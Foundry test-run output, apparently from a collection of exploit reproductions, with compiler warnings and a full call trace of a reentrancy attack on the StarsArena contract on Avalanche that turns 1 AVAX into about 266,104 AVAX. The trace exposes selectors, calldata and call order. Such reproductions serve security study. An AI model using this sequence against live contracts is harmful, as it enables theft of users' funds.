Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.16s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 268.58ms (204.43µs CPU time)

Ran 1 test for src/test/2023-10/StarsArena_exp.sol:ContractTest
[PASS] testExploit() (gas: 265813)
Logs:
  Attacker AVAX balance before exploit: 1.000000000000000000
  Attacker AVAX balance after exploit: 266103.972780000000000000

Traces:
  [337532] ContractTest::testExploit()
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18])
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker AVAX balance before exploit", val: 1000000000000000000 [1e18], decimals: 18)
    ├─ [271509] 0xA481B139a1A654cA19d2074F174f17D7534e8CeC::e9ccf3a3{value: 1000000000000000000}(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000010000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   ├─ [264343] 0x8aF92C23a169B58c2E5AC656D8D8a23FC725080f::e9ccf3a3{value: 1000000000000000000}(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000010000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [delegatecall]
    │   │   ├─ [0] 0x3e74a248b3d37FAa49db2c0C385b3cB59e3dE8bb::fallback{value: 120000000000000}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [118469] ContractTest::receive{value: 420000000000000}()
    │   │   │   ├─ [112325] 0xA481B139a1A654cA19d2074F174f17D7534e8CeC::5632b2e4(000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00)
    │   │   │   │   ├─ [111653] 0x8aF92C23a169B58c2E5AC656D8D8a23FC725080f::5632b2e4(000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00) [delegatecall]
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] 
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [201] ContractTest::receive{value: 993400000000000000}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x3e74a248b3d37FAa49db2c0C385b3cB59e3dE8bb::fallback{value: 60000000000000}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─  emit topic 0: 0xc9d4f93ded9b42fa24561e02b2a40f720f71601eb1b3f7b3fd4eff20877639ee
    │   │   │           data: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000001550f7dca7000000000000000000000000000000000000000000000000000000006d23ad5f800000000000000000000000000000000000000000000000000000017dfcdece400000000000000000000000000000000000000000000000000000003691d6afc00000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000031bced02db00000000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [47337] 0xA481B139a1A654cA19d2074F174f17D7534e8CeC::sellShares(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   ├─ [46677] 0x8aF92C23a169B58c2E5AC656D8D8a23FC725080f::sellShares(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1) [delegatecall]
    │   │   ├─ [201] ContractTest::receive{value: 246899671200000000000000}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x3e74a248b3d37FAa49db2c0C385b3cB59e3dE8bb::fallback{value: 5486659360000000000000}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [201] ContractTest::receive{value: 19203307760000000000000}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x3e74a248b3d37FAa49db2c0C385b3cB59e3dE8bb::fallback{value: 2743329680000000000000}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─  emit topic 0: 0xc9d4f93ded9b42fa24561e02b2a40f720f71601eb1b3f7b3fd4eff20877639ee
    │   │   │           data: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000003a179eb7f5a46b8400000000000000000000000000000000000000000000000001296eb1c25a54120000000000000000000000000000000000000000000000000411036e283c263f0000000000000000000000000000000000000000000000000094b758e12d2a0900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003a179eb7f5a46b8400000000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker AVAX balance after exploit", val: 266103972780000000000000 [2.661e23], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 309.67ms (4.95ms CPU time)

Ran 2 test suites in 633.77ms (578.25ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
